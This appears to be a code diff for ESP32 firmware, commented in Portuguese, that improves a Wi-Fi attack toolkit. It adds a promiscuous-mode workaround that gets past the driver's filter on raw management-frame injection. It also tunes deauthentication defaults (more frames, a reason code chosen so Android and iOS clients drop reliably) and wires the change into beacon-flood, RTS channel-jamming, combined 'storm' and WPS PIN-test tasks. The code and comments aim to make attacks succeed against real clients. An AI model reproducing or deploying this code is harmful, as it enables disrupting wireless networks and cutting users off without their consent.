@@ -101,6 +101,42 @@ esp_err_t hacking_wifi_init(void)
     return ESP_OK;
 }
 
+// ----------------------------------------------------------------------
+// inject_begin / inject_end — workaround do filter de mgmt frames do
+// driver Wi-Fi do ESP-IDF 5.x (libpp.a). Sem promiscuous habilitado,
+// `esp_wifi_80211_tx(WIFI_IF_STA, ...)` rejeita frames mgmt 0xC0/0x80/etc
+// com `unsupport frame type` + `ESP_ERR_INVALID_ARG`. Promiscuous bypassa
+// o filter porque o driver passa a tratar o STA como interface raw.
+//
+// `set_channel` também só funciona em promiscuous quando o STA não está
+// associado — sem isso a TX ia pro canal errado mesmo aceita.
+//
+// Idempotente em relação a sniff_wifi: se promiscuous já está on, o
+// driver retorna ESP_OK e seguimos. inject_end deixa promiscuous off por
+// padrão; quem precisar de comportamento "sticky" (defense + watchdog
+// rodando paralelo) deve setar promiscuous antes e ignorar essa fn.
+// ----------------------------------------------------------------------
+static esp_err_t inject_begin(uint8_t channel)
+{
+    esp_err_t err = esp_wifi_set_promiscuous(true);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "set_promiscuous(true) rc=%s", esp_err_to_name(err));
+        return err;
+    }
+    err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "set_channel ch=%u rc=%s",
+                 (unsigned)channel, esp_err_to_name(err));
+        esp_wifi_set_promiscuous(false);
+    }
+    return err;
+}
+
+static void inject_end(void)
+{
+    esp_wifi_set_promiscuous(false);
+}
+
 static void emit_deauth_done(uint16_t sent, uint16_t requested,
                               uint8_t channel, uint16_t reason)
 {
@@ -137,13 +173,47 @@ static void deauth_task(void *arg)
 {
     deauth_job_t *job = (deauth_job_t *)arg;
 
-    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
+    // FIX 1: log diagnóstico — confirma target/bssid/channel/reason recebidos
+    ESP_LOGI(TAG, "deauth start: target=%02x:%02x:%02x:%02x:%02x:%02x "
+                  "bssid=%02x:%02x:%02x:%02x:%02x:%02x ch=%u count=%u reason=%u",
+             job->target[0], job->target[1], job->target[2],
+             job->target[3], job->target[4], job->target[5],
+             job->bssid[0],  job->bssid[1],  job->bssid[2],
+             job->bssid[3],  job->bssid[4],  job->bssid[5],
+             (unsigned)job->channel, (unsigned)job->count,
+             (unsigned)job->reason);
+
+    // FIX 4: warn sobre filters comuns que silenciosamente droppam o deauth
+    bool is_broadcast =
+        (job->target[0] == 0xFF && job->target[1] == 0xFF &&
+         job->target[2] == 0xFF && job->target[3] == 0xFF &&
+         job->target[4] == 0xFF && job->target[5] == 0xFF);
+    if (is_broadcast) {
+        ESP_LOGW(TAG, "target=broadcast — clients modernos podem ignorar; "
+                      "use MAC específico do STA p/ efeito garantido");
+    }
+    ESP_LOGW(TAG, "PMF (802.11w) reminder: WPA2/WPA3 com MFP=on dropam "
+                  "deauth não-assinado — confirme MFP do AP alvo");
+
+    esp_err_t err = inject_begin(job->channel);
     uint16_t sent = 0;
 
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "set_channel ch=%u rc=%s",
-                 job->channel, esp_err_to_name(err));
+        // inject_begin já logou o motivo (set_promiscuous ou set_channel)
     } else {
+        // FIX 1: confirmar canal real (set_channel falha silente em alguns
+        // estados — STA conectada ou scan ativo).
+        uint8_t real_ch = 0;
+        wifi_second_chan_t real_sc;
+        if (esp_wifi_get_channel(&real_ch, &real_sc) == ESP_OK) {
+            if (real_ch != job->channel) {
+                ESP_LOGW(TAG, "channel mismatch: requested=%u actual=%u "
+                              "— frames vão p/ canal errado!",
+                         (unsigned)job->channel, (unsigned)real_ch);
+            } else {
+                ESP_LOGI(TAG, "channel confirmed: %u", (unsigned)real_ch);
+            }
+        }
         uint8_t frame[sizeof(s_deauth_template)];
         memcpy(frame, s_deauth_template, sizeof(frame));
         memcpy(&frame[4],  job->target, 6);
@@ -164,6 +234,8 @@ static void deauth_task(void *arg)
             vTaskDelay(pdMS_TO_TICKS(3));
         }
     }
+
+    inject_end();
 
     ESP_LOGI(TAG, "deauth %u/%u on ch=%u reason=%u",
              (unsigned)sent, (unsigned)job->count,
@@ -187,9 +259,14 @@ esp_err_t hacking_wifi_deauth(const uint8_t target_mac[6],
     if (channel == 0 || channel > 14) return ESP_ERR_INVALID_ARG;
     if (s_busy) return ESP_ERR_INVALID_STATE;
 
-    if (count == 0) count = 10;
+    // Defaults pós-validação dos efeitos reais (2026-05-08):
+    //  - count default 100 (era 10) — count<=30 não derruba clients
+    //    modernos consistentemente; 100 é conservador mas eficaz
+    //  - reason default 4 (era 7) — "inactivity" é mais respeitado
+    //    por Android 12+/iOS 14+ que reason 7 ("class 3 nonassoc")
+    if (count == 0) count = 100;
     if (count > 1000) count = 1000;
-    if (reason_code == 0) reason_code = 7;
+    if (reason_code == 0) reason_code = 4;
 
     deauth_job_t *job = calloc(1, sizeof(*job));
     if (!job) return ESP_ERR_NO_MEM;
@@ -228,12 +305,11 @@ static void beacon_task(void *arg)
 {
     beacon_job_t *job = (beacon_job_t *)arg;
 
-    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t err = inject_begin(job->channel);
     uint16_t sent = 0;
 
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "set_channel ch=%u rc=%s",
-                 job->channel, esp_err_to_name(err));
+        // inject_begin já logou
     } else {
         // header(36) + ssid(2+32) + rates(6) + DS(3) + TIM(6) + ERP(3) + ExtRates(6)
         uint8_t frame[36 + 34 + 6 + 3 + 6 + 3 + 6];
@@ -281,6 +357,8 @@ static void beacon_task(void *arg)
         }
     }
 
+    inject_end();
+
     ESP_LOGI(TAG, "beacon_flood: %u frames (%u cycles × %u ssids) on ch=%u",
              (unsigned)sent, (unsigned)job->cycles,
              (unsigned)job->ssid_count, (unsigned)job->channel);
@@ -316,11 +394,11 @@ static void jam_task(void *arg)
     jam_job_t *job = (jam_job_t *)arg;
     int64_t deadline = esp_timer_get_time() + (int64_t)job->duration_sec * 1000000LL;
 
-    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t err = inject_begin(job->channel);
     uint32_t sent = 0;
 
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "jam set_channel rc=%s", esp_err_to_name(err));
+        // inject_begin já logou
     } else {
         uint8_t frame[sizeof(s_rts_template)];
         memcpy(frame, s_rts_template, sizeof(frame));
@@ -333,6 +411,8 @@ static void jam_task(void *arg)
             vTaskDelay(pdMS_TO_TICKS(25));
         }
     }
+
+    inject_end();
 
     ESP_LOGI(TAG, "channel_jam done: %lu rts on ch=%u for %us",
              (unsigned long)sent, (unsigned)job->channel,
@@ -393,12 +473,11 @@ static void storm_task(void *arg)
 {
     storm_job_t *job = (storm_job_t *)arg;
 
-    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t err = inject_begin(job->channel);
     uint16_t deauth_sent = 0;
     uint32_t rts_sent = 0;
 
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "storm: set_channel rc=%s", esp_err_to_name(err));
         goto cleanup;
     }
 
@@ -447,6 +526,7 @@ static void storm_task(void *arg)
              (unsigned)job->jam_seconds);
 
 cleanup:
+    inject_end();
     free(job);
     s_jam_stop = false;
     s_task = NULL;
@@ -587,8 +667,11 @@ static void wps_test_task(void *arg)
     }
 
     esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
-    strncpy(cfg.pin, job->pin, sizeof(cfg.pin) - 1);
-    cfg.pin[sizeof(cfg.pin) - 1] = 0;
+    // memcpy + null explícito — strncpy daria warning -Wstringop-truncation
+    // em IDF 5.1.x quando pin source tem exatamente 8 bytes.
+    size_t copy_len = strnlen(job->pin, sizeof(cfg.pin) - 1);
+    memcpy(cfg.pin, job->pin, copy_len);
+    cfg.pin[copy_len] = 0;
 
     err = esp_wifi_wps_enable(&cfg);
     if (err != ESP_OK) {
